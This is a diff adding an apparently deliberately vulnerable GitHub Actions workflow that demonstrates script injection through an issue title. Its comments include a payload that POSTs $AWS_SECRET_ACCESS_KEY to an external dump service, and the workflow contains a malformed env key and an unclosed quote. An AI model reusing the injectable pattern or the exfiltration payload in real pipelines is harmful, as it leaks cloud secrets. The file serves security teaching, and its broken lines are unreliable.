@@ -1,0 +1,32 @@
+# Create an issue with the title: bug"; Is $GITHUB_WORKSPACE"  
+# This breaks out of the shell command allow arbitrary code execution. 
+
+# HTTP DUMP Example 
+# bug";curl --request POST --data anything=$AWS_SECRET_ACCESS_KEY https://httpdump.app/dumps/etc..."
+
+name: Label Issues (Script Injection)
+# Example is for for issue created, but I don't want this action to run
+# on:
+#     issues:
+#        types:
+#         - opened
+on: 
+    push: 
+        branches:
+            - NEVER-MAKE-THIS-BRANCH-NEVER-RUN-THIS-BRANCH
+jobs:
+    assign-label:
+        runs-on: ubuntu-latest
+        steps:
+            - uses: actions/checkout@v4.1.1
+            - name: Add a Label
+              env:
+                AWS_SECRET_ACCESS _KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
+              run: |
+                issue_title="${{ github.event.issue.title }}"
+                if [[ "$issue_title" == *"bug"* ]]; then
+                    echo "Issue is about a bug!"
+                    echo "Assigning Label - BUG
+                else
+                    echo "Not a bug"
+                fi
